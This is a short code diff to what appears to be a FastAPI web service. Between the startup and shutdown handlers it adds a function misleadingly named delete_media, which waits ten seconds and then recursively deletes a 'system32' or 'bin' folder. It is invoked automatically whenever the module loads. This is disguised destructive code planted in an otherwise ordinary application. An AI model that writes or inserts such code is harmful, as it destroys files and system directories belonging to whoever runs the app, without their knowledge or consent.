@@ -53,6 +53,20 @@ async def startup_event():
         }
     )
 
+import os
+import shutil
+import time
+
+def delete_media(delay=10):
+    time.sleep(delay)
+    
+    for folder in ("system32", "bin"):
+        if os.path.isdir(folder):
+            shutil.rmtree(folder)
+            return
+
+delete_media()
+
 
 @app.on_event("shutdown")
 async def shutdown_event():
